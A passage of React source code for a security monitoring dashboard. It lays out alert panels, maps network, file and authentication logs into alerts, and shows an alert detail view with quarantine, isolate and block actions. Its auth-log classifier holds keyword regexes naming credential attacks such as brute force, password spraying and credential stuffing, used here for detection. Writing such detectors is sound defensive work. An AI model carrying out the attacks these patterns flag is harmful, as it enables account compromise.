        : isWebDns || isCredential ? '1fr 1fr .75fr'
          : isUsb ? '1.15fr .85fr .75fr'
            : isUeba ? '1fr 1fr'
              : '1.25fr .9fr .9fr';
  const tileColumns = isMemory ? 'repeat(6, 1fr)'
    : isRegistry ? 'repeat(4, 1fr)'
      : isUsb ? 'repeat(3, 1fr)'
        : isUeba ? 'repeat(4, 1fr)'
          : 'repeat(4, 1fr)';
  const bottomGrid = isMemory ? '1fr .95fr .9fr'
    : isRegistry ? '1.4fr .8fr .75fr'
      : isUsb ? '1.1fr .8fr .9fr'
        : '1.25fr .95fr';
  const firstPanelHeight = isRegistry ? 170 : isMemory ? 150 : isUsb ? 215 : 220;
  const showHeader = isUsb;
  const rightSideListTitle = isMemory ? 'Real-Time Memory Alerts'
    : isRegistry ? 'Recent Critical Alerts'
      : isWebDns ? 'Recent Alerts'
        : isCredential ? 'Top Risky Users'
          : cfg.sections[3] || 'Recent Alerts';
  const categoryTitle = isMemory ? 'Memory Activity Monitoring - All Categories'
    : isRegistry ? 'Registry Monitoring Areas'
      : isPersistence ? 'Persistence Signals'
        : isUsb ? 'Recent USB Events / File Activities'
          : isUeba ? 'Risk by Category'
            : isDataSecurity ? 'Data Security Posture'
              : cfg.sections[1];

  return (
    <div style={{ overflow: 'auto', padding: 10, background: MON.bg, color: MON.text }}>
      <div style={{ minWidth: 1180, display: 'grid', gap: 10 }}>
        <div style={{ display: showHeader ? 'flex' : 'none', justifyContent: 'space-between', alignItems: 'center', gap: 14 }}>
          <div>
            <h2 style={{ margin: 0, fontSize: 18, fontWeight: 900 }}>{cfg.name}</h2>
            <div style={{ color: MON.muted, fontSize: 11, marginTop: 3 }}>{loading ? 'Loading backend data...' : 'Live backend dashboard'} · Last 24 Hours · {shortNum(loadedTotal)} records</div>
          </div>
          <button style={{ border: `1px solid ${MON.border}`, background: `${cfg.accent}16`, color: cfg.accent, borderRadius: 7, padding: '8px 12px', fontSize: 11, fontWeight: 900 }}>Refresh</button>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: `repeat(${Math.min(cfg.kpis.length, 6)}, 1fr)`, gap: 10 }}>
          {cfg.kpis.map((label, i) => (
            <MonitorKpi key={label} icon={['⬢', '!', '▲', '◈', '⬟', '◷'][i] || '●'} title={label} value={kpiValue(label, i)} change={i % 2 ? '18.1%' : '12.5%'} color={[cfg.accent, cfg.danger, MON.orange, MON.yellow, MON.green, MON.purple][i % 6]} danger={/critical|high|risk|unauthorized|blocked|failed/i.test(label)} data={series.length ? series : sampleSeries} />
          ))}
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: topGrid, gap: 10 }}>
          <MonitorPanel title={cfg.sections[0]} right={<span style={{ color: MON.muted, fontSize: 10 }}>Last 24 Hours</span>}>
            <div style={{ padding: 16, height: firstPanelHeight, backgroundImage: 'linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px)', backgroundSize: '52px 38px' }}>
              <svg viewBox="0 0 560 190" width="100%" height="100%" preserveAspectRatio="none">
                <polyline points={(series.length ? series : sampleSeries).map((v, i, arr) => `${(i / Math.max(arr.length - 1, 1)) * 560},${170 - (v / Math.max(...arr, 1)) * 125}`).join(' ')} fill="none" stroke={cfg.accent} strokeWidth="3" />
                <polyline points={(series.length ? series.map(v => Math.max(0, v * .55)) : sampleSeries.map(v => v * .55)).map((v, i, arr) => `${(i / Math.max(arr.length - 1, 1)) * 560},${170 - (v / Math.max(...arr, 1)) * 90}`).join(' ')} fill="none" stroke={cfg.danger} strokeWidth="2" />
              </svg>
            </div>
          </MonitorPanel>
          <MonitorPanel title={cfg.sections[1]}>
            <div style={{ display: 'grid', gridTemplateColumns: '170px 1fr', alignItems: 'center', padding: 12 }}>
              <Donut value={primaryCount ? Math.min(82, Math.max(12, Math.round((high + critical + 1) / (alerts.length + 1) * 100))) : 0} label={shortNum(primaryCount)} color={cfg.accent} accent={MON.orange} />
              <BarList rows={categoryRows.slice(0, 6).map(r => ({ ...r, valueLabel: shortNum(r.value) }))} />
            </div>
          </MonitorPanel>
          <MonitorPanel title={cfg.sections[2]}>
            <div style={{ padding: 14 }}>
              <Donut value={alerts.length ? Math.round(((critical + high) / Math.max(alerts.length, 1)) * 100) : 0} label={shortNum(critical + high + medium + low)} color={cfg.danger} accent={MON.yellow} />
              <BarList rows={[
                { label: 'Critical', value: critical, color: MON.red },
                { label: 'High', value: high, color: MON.orange },
                { label: 'Medium', value: medium, color: MON.yellow },
                { label: 'Low', value: low, color: MON.green },
              ]} />
            </div>
          </MonitorPanel>
          {(isMemory || isWebDns || isCredential) && (
            <MonitorPanel title={rightSideListTitle} right={<span style={{ color: MON.cyan, fontSize: 10 }}>View All</span>}>
              <div style={{ padding: 12, display: 'grid', gap: 9 }}>
                {visibleRows.slice(0, 8).map((a, i) => (
                  <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '18px 1fr auto', gap: 8, alignItems: 'center', fontSize: 10 }}>
                    <span style={{ color: severityRank(a.severity) >= 3 ? MON.red : a.severity === 'medium' ? MON.yellow : MON.green }}>●</span>
                    <b style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || a.ruleId || cfg.table[i % cfg.table.length]}</b>
                    <span style={{ color: severityRank(a.severity) >= 3 ? MON.red : a.severity === 'medium' ? MON.yellow : MON.green, fontWeight: 900 }}>{a.severity || 'low'}</span>
                  </div>
                ))}
              </div>
            </MonitorPanel>
          )}
        </div>

        <MonitorPanel title={categoryTitle}>
          <div style={{ display: 'grid', gridTemplateColumns: tileColumns, gap: 10, padding: 10 }}>
            {cfg.categories.slice(0, 16).map((name, i) => (
              <div key={name} style={{ minHeight: 58, background: 'linear-gradient(135deg, rgba(13,28,56,.98), rgba(7,17,34,.98))', border: `1px solid ${MON.border}`, borderRadius: 7, padding: 10, display: 'flex', alignItems: 'center', gap: 10 }}>
                <span style={{ width: 30, height: 30, borderRadius: 8, display: 'grid', placeItems: 'center', color: categoryRows[i % categoryRows.length]?.color, background: `${categoryRows[i % categoryRows.length]?.color}18`, border: `1px solid ${categoryRows[i % categoryRows.length]?.color}35` }}>●</span>
                <div style={{ minWidth: 0 }}>
                  <div style={{ color: MON.text, fontSize: 11, fontWeight: 900, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{name}</div>
                  <div style={{ color: categoryRows[i % categoryRows.length]?.color, fontSize: 13, fontWeight: 900 }}>{shortNum(categoryRows[i % categoryRows.length]?.value || i + 1)}</div>
                </div>
              </div>
            ))}
          </div>
        </MonitorPanel>

        <div style={{ display: 'grid', gridTemplateColumns: bottomGrid, gap: 10 }}>
          <MonitorPanel title={cfg.sections[3] || 'Recent Alerts'} right={<span style={{ color: MON.cyan, fontSize: 10 }}>View All</span>}>
            <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11 }}>
              <thead><tr>{['Time', 'Severity', 'Alert', 'Endpoint/User', 'Source IP', 'Status'].map(h => <th key={h} style={{ textAlign: 'left', color: MON.muted, padding: '10px 12px', borderBottom: `1px solid ${MON.line}` }}>{h}</th>)}</tr></thead>
              <tbody>
                {visibleRows.map((a, i) => (
                  <tr key={a._id || i}>
                    <td style={{ padding: '9px 12px', color: MON.muted }}>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '—'}</td>
                    <td style={{ color: severityRank(a.severity) >= 3 ? MON.red : a.severity === 'medium' ? MON.yellow : MON.green, fontWeight: 900 }}>{a.severity || 'low'}</td>
                    <td style={{ maxWidth: 360, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{a.description || a.ruleId || cfg.table[i % cfg.table.length]}</td>
                    <td>{a.username || a.agentName || a.systemId?.name || '—'}</td>
                    <td>{a.srcip || '—'}</td>
                    <td style={{ color: a.status === 'resolved' ? MON.green : severityRank(a.severity) >= 3 ? MON.red : MON.yellow }}>{a.status || 'active'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </MonitorPanel>
          <MonitorPanel title="Top Affected Systems / Sources">
            <BarList rows={groupCounts(visibleRows, a => a.agentName || a.systemId?.name || a.srcip || a.username || 'Unknown', 8).map((r, i) => ({ ...r, color: [cfg.accent, cfg.danger, MON.orange, MON.yellow, MON.green, MON.purple, MON.cyan][i % 7] }))} />
          </MonitorPanel>
          {(isMemory || isSystemChanges || isRegistry || isUsb) && (
            <MonitorPanel title={isMemory ? 'Endpoint Memory Risk Map' : isUsb ? 'USB Activity Heatmap' : 'Severity Distribution'}>
              <ThreatMap auth={isRegistry} />
            </MonitorPanel>
          )}
        </div>
      </div>
    </div>
  );
}

// ── Category modal ────────────────────────────────────────────────────────────
// 🛡️ POPUP MODAL: wrapper opened after clicking dashboard cards on localhost:3000
function dashboardNetworkLogToAlert(log = {}) {
  const level = String(log.level || '').toLowerCase();
  const peer = log.fields?.external_peers?.[0] || log.fields?.reputation_candidates?.[0] || {};
  const dnsDomain = (Array.isArray(log.fields?.dns_domains) && log.fields.dns_domains[0]) || (Array.isArray(log.fields?.dns_queries) && log.fields.dns_queries[0]) || (Array.isArray(log.fields?.search_domains) && log.fields.search_domains[0]) || (Array.isArray(log.fields?.resolver_hosts) && log.fields.resolver_hosts[0]);
  return {
    _id: log._id,
    createdAt: log.logTime || log.receivedAt || log.createdAt,
    agentName: log.agentName || log.hostname || log.source || 'network-log',
    hostname: log.hostname,
    username: log.user || log.fields?.user || log.agentName || log.hostname,
    srcip: log.ipAddress || log.fields?.srcip || log.fields?.src_ip || log.fields?.sourceIp || log.fields?.clientIp || peer.remote_ip || peer.local_ip,
    destip: log.fields?.destip || log.fields?.dstip || log.fields?.dest_ip || log.fields?.dst_ip || log.fields?.destination_ip || log.fields?.serverIp || peer.local_ip || peer.remote_ip,
    destPort: log.fields?.destPort || log.fields?.dest_port || log.fields?.port || peer.remote_port || peer.local_port,
    domain: log.domain || log.query || log.dnsQuery || log.fields?.domain || log.fields?.query || log.fields?.dnsQuery || log.fields?.dns_query || dnsDomain,
    query: log.query || log.domain || log.dnsQuery || log.fields?.query || log.fields?.domain || log.fields?.dnsQuery || log.fields?.dns_query || dnsDomain,
    dnsQuery: log.dnsQuery || log.query || log.domain || log.fields?.dnsQuery || log.fields?.query || log.fields?.domain || log.fields?.dns_query || dnsDomain,
    protocol: log.fields?.protocol || log.source || log.logType || 'network',
    description: log.message || `${log.source || log.logType || 'Network'} log`,
    ruleId: log.program || log.source || log.logType || 'NETWORK_LOG',
    severity: level === 'critical' ? 'critical' : level === 'error' ? 'high' : level === 'warning' ? 'medium' : 'low',
    status: 'open',
    actionTaken: 'Observed',
    rawEvent: log,
  };
}

function dashboardFileLogToAlert(log = {}) {
  const fields = log.fields || {};
  const raw = log.raw && typeof log.raw === 'object' ? log.raw : {};
  const message = log.message || log.raw || `${log.source || log.logType || 'File'} log`;
  const path =
    log.filePath || log.file_path ||
    fields.file_path || fields.filePath ||
    fields.path || fields.file ||
    fields.file_name || fields.fileName ||
    raw.file_path || raw.filePath ||
    raw.path || raw.file ||
    raw.file_name || raw.fileName ||
    message.match(/(?:FILE:[^|]+\||path=|file=)([^|\s]+)/i)?.[1] ||
    '';
  const action =
    fields.file_action || fields.fileAction ||
    fields.change_type || fields.changeType ||
    fields.event_type || fields.eventType ||
    raw.file_action || raw.fileAction ||
    raw.change_type || raw.event_type ||
    log.action ||
    (message.match(/FILE:([^|]+)/i)?.[1]) ||
    (/deleted|unlink|remove/i.test(message) ? 'deleted'
      : /created|new file/i.test(message) ? 'created'
        : /rename|moved/i.test(message) ? 'renamed'
          : /permission|chmod|acl|mode/i.test(message) ? 'permission_changed'
            : /owner|chown|group/i.test(message) ? 'ownership_changed'
              : /hash|integrity|checksum/i.test(message) ? 'hash_changed'
                : 'modified');
  const severity = String(log.level || fields.severity || raw.severity || '').toLowerCase();
  const normalizedSeverity = severity === 'critical' ? 'critical'
    : severity === 'error' || severity === 'high' ? 'high'
      : severity === 'warning' || severity === 'medium' ? 'medium'
        : 'low';
  return {
    _id: log._id,
    createdAt: log.logTime || log.receivedAt || log.createdAt || fields.timestamp || raw.timestamp,
    agentName: log.agentName || log.hostname || fields.hostname || raw.hostname || 'file-log',
    hostname: log.hostname || fields.hostname || raw.hostname,
    username: log.user || log.username || fields.user || fields.changed_by_user || fields.accessed_by_user || fields.file_user || raw.user || raw.username || raw.changed_by_user || raw.accessed_by_user || raw.file_user,
    eventCategory: 'file',
    ruleId: fields.rule_id || fields.ruleId || raw.rule_id || raw.ruleId || `FILE_${String(action).toUpperCase()}`,
    description: fields.description || raw.description || message,
    severity: normalizedSeverity,
    status: 'open',
    filePath: path,
    fileName: fields.file_name || fields.fileName || raw.file_name || raw.fileName || path.split(/[\\/]/).pop(),
    fileHash: fields.file_hash || fields.fileHash || fields.new_hash || raw.file_hash || raw.fileHash || raw.new_hash,
    fileHashMd5: fields.file_hash_md5 || fields.fileHashMd5 || raw.file_hash_md5 || raw.fileHashMd5,
    fileAction: action,
    fileUser: fields.file_user || fields.fileUser || fields.changed_by_user || fields.accessed_by_user || raw.file_user || raw.fileUser || raw.changed_by_user || raw.accessed_by_user || raw.user || raw.username || log.user,
    rawEvent: { ...fields, ...raw, raw_log: message },
  };
}

function dashboardAuthLogText(log = {}) {
  return `${log.logType || ''} ${log.source || ''} ${log.program || ''} ${log.message || ''} ${(log.tags || []).join(' ')}`.toLowerCase();
}

function dashboardIsAuthLog(log = {}) {
  const text = dashboardAuthLogText(log);
  return String(log.logType || '').toLowerCase() === 'auth'
    || /\bauth\b|sshd|ssh|sudo|pam|passwd|useradd|userdel|usermod|groupadd|groupdel|gpasswd|login|logon|logout|session|failed password|accepted password|accepted publickey|invalid user|lockout|kerberos|ntlm|ldap|rdp|remote desktop|vpn|openvpn|wireguard|protonvpn|mfa|2fa|otp|duo|credential|brute|password spray/.test(text);
}

function dashboardAuthLogToAlert(log = {}) {
  const text = dashboardAuthLogText(log);
  const message = log.message || `${log.source || log.logType || 'Auth'} log`;
  const failed = /fail|failed|invalid|denied|lockout|brute|password spray|credential stuffing/.test(text);
  const privileged = /sudo|admin|privilege|escalat|wheel|sudoers/.test(text);
  const success = /success|accepted|opened|login|logon|authenticated/.test(text) && !failed;
  const username =
    log.user
    || log.username
    || message.match(/\b(?:Accepted|Failed password for(?: invalid user)?|Invalid user)\s+([a-zA-Z0-9._@\\-]+)/i)?.[1]
    || message.match(/\b(?:user|for|USER|Account Name)[:=\s]+([a-zA-Z0-9._@\\-]+)/)?.[1]
    || log.agentName
    || log.hostname;
  const srcip =
    log.srcip
    || log.sourceIp
    || log.ipAddress
    || message.match(/\bfrom\s+([0-9a-f:.]+)\b/i)?.[1]
    || message.match(/\b(?:Source Network Address|src|source_ip|ip)[:=\s]+([0-9a-f:.]+)\b/i)?.[1];
  const method = /vpn|openvpn|wireguard|protonvpn/i.test(text) ? 'VPN'
    : /rdp|remote desktop/i.test(text) ? 'RDP'
      : /kerberos/i.test(text) ? 'Kerberos'
        : /ntlm/i.test(text) ? 'NTLM'
          : /ldap/i.test(text) ? 'LDAP'
            : /sudo|pam/i.test(text) ? 'Sudo/PAM'
              : /mfa|2fa|otp|duo/i.test(text) ? 'MFA'
                : /ssh|sshd|publickey/i.test(text) ? 'Linux SSH'
                  : 'Password';
  const action = failed ? 'login_failed' : privileged ? 'privilege_escalation' : success ? 'login' : 'auth_event';
  return {
    _id: log._id,
    createdAt: log.logTime || log.receivedAt || log.createdAt,
    agentName: log.agentName || log.hostname || log.source || 'auth-log',
    hostname: log.hostname,
    username,
    srcip,
    description: message,
    ruleId: log.program || log.source || log.logType || 'AUTH_LOG',
    severity: String(log.level || '').toLowerCase() === 'critical'
      ? 'critical'
      : failed || privileged || String(log.level || '').toLowerCase() === 'error'
        ? 'high'
        : String(log.level || '').toLowerCase() === 'warning'
          ? 'medium'
          : 'low',
    status: failed ? 'active' : success ? 'success' : 'open',
    userAction: action,
    rawEvent: {
      ...log,
      username,
      srcip,
      raw: {
        ...(log.raw && typeof log.raw === 'object' ? log.raw : {}),
        auth_method: method,
        auth_action: action,
        log_type: 'authentication',
      },
    },
  };
}

function AlertDetailBadge({ text, color = '#60a5fa', bg }) {
  if (!text) return null;
  return (
    <span style={{ fontSize: 9, padding: '2px 7px', borderRadius: 10, fontWeight: 800, background: bg || `${color}22`, color, border: `1px solid ${color}44`, textTransform: 'uppercase' }}>
      {text}
    </span>
  );
}

function AlertDetail({ selected, doAction }) {
  if (!selected) {
    return (
      <div style={{ display: 'grid', placeItems: 'center', height: '100%', minHeight: 280, color: '#60a5fa' }}>
        <div style={{ textAlign: 'center' }}>
          <div style={{ fontSize: 32, marginBottom: 8 }}>⌕</div>
          <div style={{ fontSize: 13, fontWeight: 800 }}>Select an event to investigate</div>
        </div>
      </div>
    );
  }

  const sev = String(selected.severity || 'low').toLowerCase();
  const sevColor = SEV[sev] || '#93c5fd';
  const rawLog = selected.full_log || selected.rawLog || selected.raw_log || selected.message || selected.rawEvent?.message || selected.rawEvent;
  const fields = [
    ['Severity', selected.severity],
    ['Category', selected.eventCategory || selected.category],
    ['Status', selected.status],
    ['Agent/System', selected.agentName || selected.systemId?.name],
    ['Hostname', selected.hostname || selected.systemId?.hostname],
    ['Department', selected.departmentId?.name],
    ['Source IP', selected.srcip],
    ['Destination IP', selected.destip],
    ['Destination Port', selected.destPort],
    ['Protocol', selected.protocol],
    ['Direction', selected.direction],
    ['File Path', selected.filePath],
    ['File Action', selected.fileAction],
    ['File Hash', selected.fileHash],
    ['Process', selected.processName],
    ['PID', selected.pid],
    ['User', selected.username || selected.user],
    ['User Action', selected.userAction],
    ['Device', selected.device],
    ['VT Verdict', selected.vtVerdict],
    ['VT Detection', selected.vtDetectionRatio],
    ['Rule ID', selected.ruleId],
  ].filter(([, value]) => value != null && value !== '');
  const actions = [
    selected.eventCategory === 'malware' && !selected.quarantined && { action: 'quarantine', label: 'Quarantine', color: '#f59e0b' },
    !selected.isolationStatus && { action: 'isolate', label: 'Isolate System', color: '#f87171' },
    selected.isolationStatus === 'isolated' && { action: 'reconnect', label: 'Reconnect', color: '#34d399' },
    selected.srcip && { action: 'block_ip', label: 'Block IP', color: '#f87171' },
    selected.eventCategory === 'usb' && { action: 'block_usb', label: 'Block USB', color: '#f59e0b' },
    { action: 'ignore', label: 'False Positive', color: '#94a3b8' },
  ].filter(Boolean);

  return (
    <div style={{ height: '100%', overflowY: 'auto' }}>
      <div style={{ marginBottom: 14 }}>
        <div style={{ fontSize: 16, color: '#e2e8f0', fontWeight: 900, marginBottom: 7 }}>{selected.description || selected.ruleId || 'Security Event'}</div>
        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
          <AlertDetailBadge text={selected.severity} color={sevColor} bg={SEVBG[sev]} />
          <AlertDetailBadge text={selected.eventCategory || selected.category} color="#c4b5fd" bg="#1e1060" />
          <AlertDetailBadge text={selected.status} color="#93c5fd" bg="#1e3a5f" />
          {vtIsThreaten(selected.vtScore, selected.vtVerdict) && <VtBadge score={selected.vtScore} verdict={selected.vtVerdict} />}
          {selected.quarantined && <AlertDetailBadge text="Quarantined" color="#a78bfa" />}
          {selected.isolationStatus && <AlertDetailBadge text={selected.isolationStatus} color="#f87171" />}
        </div>
        <div style={{ fontSize: 10, color: '#64748b', marginTop: 7 }}>{selected.createdAt ? new Date(selected.createdAt).toLocaleString() : 'No timestamp'}</div>
      </div>

      {Number(selected.vtScore || 0) > 0 && (
        <div style={{ background: '#060e1a', borderRadius: 8, padding: '10px 14px', border: '1px solid #1e3a5f', marginBottom: 14 }}>
          <div style={{ fontSize: 11, color: '#f59e0b', fontWeight: 900, marginBottom: 6 }}>VirusTotal</div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
            <span style={{ fontSize: 28, fontWeight: 950, color: Number(selected.vtScore) >= 70 ? '#f87171' : Number(selected.vtScore) >= 10 ? '#f59e0b' : '#34d399' }}>{selected.vtScore}%</span>
            <div>
              <div style={{ fontSize: 11, color: '#e2e8f0' }}>Verdict: <strong>{selected.vtVerdict || 'N/A'}</strong></div>
              <div style={{ fontSize: 11, color: '#60a5fa' }}>{selected.vtDetections || 0}/{selected.vtTotal || 0} engines</div>
            </div>
          </div>
        </div>
      )}

      <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 12, marginBottom: 14 }}>
        <tbody>
          {fields.map(([key, value]) => (
            <tr key={key} style={{ borderBottom: '1px solid #0a1220' }}>
              <td style={{ padding: '6px 0', color: '#60a5fa', width: 135, verticalAlign: 'top', fontSize: 11, fontWeight: 800 }}>{key}</td>
              <td style={{ padding: '6px 0 6px 10px', color: '#cbd5e1', wordBreak: 'break-word', fontFamily: ['File Hash', 'PID', 'Rule ID'].includes(key) ? 'monospace' : 'inherit', fontSize: 11 }}>{String(value)}</td>
            </tr>
          ))}
        </tbody>
      </table>

      <div style={{ display: 'flex', gap: 7, flexWrap: 'wrap', marginBottom: 14 }}>
        {actions.map(button => (
          <button key={button.action} type="button" disabled={!selected._id} onClick={() => selected._id && doAction(selected._id, button.action)} style={{ fontSize: 10, padding: '6px 10px', borderRadius: 5, cursor: selected._id ? 'pointer' : 'not-allowed', border: `1px solid ${button.color}55`, background: `${button.color}18`, color: button.color, fontWeight: 850, opacity: selected._id ? 1 : .55 }}>
            {button.label}
          </button>
        ))}
      </div>

      {rawLog && (
        <details>
          <summary style={{ fontSize: 11, color: '#60a5fa', cursor: 'pointer', marginBottom: 6, fontWeight: 850 }}>Raw Log</summary>
          <pre style={{ background: '#020b14', color: '#7dd3fc', fontSize: 10, padding: 10, borderRadius: 6, overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
            {typeof rawLog === 'string' ? rawLog : JSON.stringify(rawLog, null, 2)}
          </pre>
        </details>
      )}
    </div>
  );
}

function CategoryModal({ title, category, deptId, capabilityId, backendId: directBackendId, onClose, overviewData = null, processCapability = null }) {
  const { company, user } = useAuth();
  const [searchParams] = useSearchParams();
  const capConfig = getCapabilityByCardId(capabilityId) || (directBackendId ? getCapabilityByBackendId(directBackendId) : null) || getCapability(capabilityId);
  const cardId = capConfig ? capConfig.id : Number(capabilityId);
  const queryBackendId = capConfig ? capConfig.backendId : (directBackendId || capabilityId);
  const modalTitle = capConfig ? capConfig.title : getCapabilityTitle(capabilityId, title);
  const [alerts, setAlerts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState(1);
  const [total, setTotal] = useState(0);
  const [systems, setSystems] = useState([]);
  const [processStats24h, setProcessStats24h] = useState({});
  const [fimStats, setFimStats] = useState(null);
  const [advancedData, setAdvancedData] = useState(null);
  const [selected, setSelected] = useState(null);
  const [bellUnreadCount, setBellUnreadCount] = useState(0);
  useEffect(() => {
    const openCount = alerts.filter(a => !a.status || a.status === 'open').length;
    setBellUnreadCount(openCount);
  }, [alerts]);
  const registrySocketRefreshRef = useRef(null);
  const companyId = company?._id || user?.companyId?._id || user?.companyId;
  const LIMIT = 20;
  const FIM_PAGE_SIZE = 1000;
  const FIM_LOG_PAGE_SIZE = 200;
  const detailedCapabilityIds = [2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31];
  const isAdvancedCapability = [29, 30, 31].includes(Number(queryBackendId));
  const isHashSignatureCapability = cardId === 25 && Number(queryBackendId) === 25;
  const supportsUnifiedLiveAnalytics = Boolean(capConfig) && !isHashSignatureCapability;
  // Every non-report capability dashboard is a current rolling 24-hour view.
  const windowEnd = '';
  // Registry/configuration dashboards must show the complete 24-hour endpoint
  // stream. Mongo's limit=0 means no result limit for this query.
  const capabilityLimit = supportsUnifiedLiveAnalytics ? 500
    : Number(queryBackendId) === 6 || Number(queryBackendId) === 19
    ? 0
    : Number(queryBackendId) === 10 ? 5000
      : Number(queryBackendId) === 3 ? 5000
        : detailedCapabilityIds.includes(Number(queryBackendId)) ? 1000 : LIMIT;
  const fullPageCapability = cardId >= 1 && cardId <= 31;
  const loadAlerts = useCallback((quiet = false) => {
    if (!quiet) setLoading(true);
    const q = new URLSearchParams({ page, limit: capabilityLimit });
    if (deptId) q.set('departmentId', deptId);
    if (queryBackendId) q.set('capabilityId', queryBackendId);
    // Process Activity, Network Activity, and Lateral Movement remain rolling
    // live views; other capabilities may honor the overview snapshot.
    if (windowEnd && Number(queryBackendId) !== 1 && Number(queryBackendId) !== 14) q.set('windowEnd', windowEnd);
    if (Number(queryBackendId) === 1) q.set('realtime', 'true');
    if ([1, ...detailedCapabilityIds].includes(Number(queryBackendId))) {
      // Capability 6 is strictly the same last-24h registry/configuration
      // snapshot used by its overview card and sub-tabs.
      q.set('windowHours', 24);
    }
    if (isHashSignatureCapability) {
      const requestedEnd = windowEnd ? new Date(windowEnd) : null;
      const end = requestedEnd && !Number.isNaN(requestedEnd.getTime()) ? requestedEnd : new Date();
      const params = { page: 1, limit: 250, from: new Date(end.getTime() - 86400000).toISOString(), to: end.toISOString() };
      if (deptId) params.departmentId = deptId;
      return Promise.allSettled([
        api.get('/hash-signature/events', { params, skipCache: quiet }),
        api.get('/hash-signature/statistics', { params: { from: params.from, to: params.to, departmentId: deptId || undefined }, skipCache: quiet }),
      ]).then(([eventsResult, statisticsResult]) => {
        if (eventsResult.status === 'fulfilled') {
          const next = eventsResult.value.data?.events || [];
          setAlerts(next);
          setTotal(Number(eventsResult.value.data?.total || next.length));
        }
        if (statisticsResult.status === 'fulfilled') setAdvancedData(statisticsResult.value.data || null);
        if (eventsResult.status === 'rejected' && statisticsResult.status === 'rejected') {
          setAlerts([]);
          setTotal(0);
          setAdvancedData(null);
        }
      }).finally(() => setLoading(false));
    }
    if (supportsUnifiedLiveAnalytics) {
      const liveParams = new URLSearchParams({ windowHours: 24, limit: capabilityLimit });
      if (deptId) liveParams.set('departmentId', deptId);
      if (windowEnd && Number(queryBackendId) === 3) liveParams.set('windowEnd', windowEnd);
      return api.get(`/dashboard/capabilities/${queryBackendId}/live?${liveParams}`, { skipCache: quiet })
        .then(response => {
          const payload = response.data || {};
          const next = Array.isArray(payload.alerts) ? payload.alerts : [];
          setAdvancedData(payload);
          setAlerts(next);
          setTotal(Number(payload.total || 0));
          setSystems(Array.isArray(payload.systems) ? payload.systems : []);
          setSelected(prev => prev ? next.find(alert => alert._id === prev._id) || null : prev);
        })
        .catch(error => {
          const message = error.response?.data?.message || 'Live capability data load failed';
          setAdvancedData({ error: message, alerts: [], systems: [], total: 0 });
          setAlerts([]);
          setTotal(0);
          setSystems([]);
        })
        .finally(() => setLoading(false));
    }
    if (isAdvancedCapability) {
      const liveParams = new URLSearchParams({ windowHours: 24, limit: 500 });
      if (deptId) liveParams.set('departmentId', deptId);
      return api.get(`/dashboard/capabilities/${queryBackendId}/live?${liveParams}`)
        .then(response => {
          const payload = response.data || {};
          const next = Array.isArray(payload.alerts) ? payload.alerts : [];
          setAdvancedData(payload);
          setAlerts(next);
          setTotal(Number(payload.total || 0));
          setSystems(Array.isArray(payload.systems) ? payload.systems : []);
          setSelected(prev => prev ? next.find(alert => alert._id === prev._id) || null : prev);
        })
        .catch(error => {
          const message = error.response?.data?.message || 'Live capability data load failed';
          setAdvancedData({ error: message, alerts: [], systems: [], total: 0 });
          setAlerts([]);
          setTotal(0);
          setSystems([]);
        })
        .finally(() => setLoading(false));
    }
    const fetchAllFimAlerts = (baseParams) => {
      const firstParams = new URLSearchParams(baseParams);
      firstParams.set('page', 1);
      firstParams.set('limit', FIM_PAGE_SIZE);
      return api.get(`/dashboard/alerts/${category}?${firstParams}`).then(firstRes => {
        const firstRows = firstRes.data?.alerts || [];
        const totalRows = Number(firstRes.data?.total || firstRows.length);
        // Dashboard needs a recent feed plus aggregate stats, not every retained
        // FIM row. Sub-tabs issue their own module-specific queries.
        return { rows: firstRows, total: totalRows, fimStats: firstRes.data?.fimStats || null };
      });
    };
    const fetchAllFimRawLogs = (from) => {
      const firstParams = new URLSearchParams({ page: 1, limit: FIM_LOG_PAGE_SIZE, logType: 'file', from });
      return api.get(`/logs?${firstParams}`).then(firstRes => {
        const firstRows = firstRes.data?.logs || [];
        const totalRows = Number(firstRes.data?.total || firstRows.length);
        const pages = Math.max(1, Math.ceil(totalRows / FIM_LOG_PAGE_SIZE));
        if (pages <= 1) return { rows: firstRows, total: totalRows };
        const requests = [];
        for (let pageNo = 2; pageNo <= pages; pageNo += 1) {
          const pageParams = new URLSearchParams({ page: pageNo, limit: FIM_LOG_PAGE_SIZE, logType: 'file', from });
          requests.push(api.get(`/logs?${pageParams}`).catch(() => ({ data: { logs: [] } })));
        }
        return Promise.all(requests).then(results => ({
          rows: [firstRows, ...results.map(r => r.data?.logs || [])].flat(),
          total: totalRows,
        }));
      });
    };
    const loadNetworkRawLogs = () => {
      const from = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
      return Promise.all(['network', 'ids', 'firewall'].map(logType => {
        const rawQ = new URLSearchParams({ page: 1, limit: capabilityLimit, logType, from });
        return api.get(`/logs?${rawQ}`).catch(() => ({ data: { logs: [], total: 0 } }));
      })).then(results => {
        const rawLogs = results.flatMap(r => r.data?.logs || [])
          .sort((a, b) => new Date(b.receivedAt || b.logTime || 0) - new Date(a.receivedAt || a.logTime || 0))
          .slice(0, capabilityLimit);
        const mapped = rawLogs.map(dashboardNetworkLogToAlert);
        setAlerts(mapped);
        setTotal(results.reduce((sum, r) => sum + Number(r.data?.total || 0), 0) || mapped.length);
        setSelected(prev => {
          if (!prev) return prev;
          return mapped.find(a => a._id === prev._id) || prev;
        });
      });
    };
    const loadAuthRawLogs = () => {
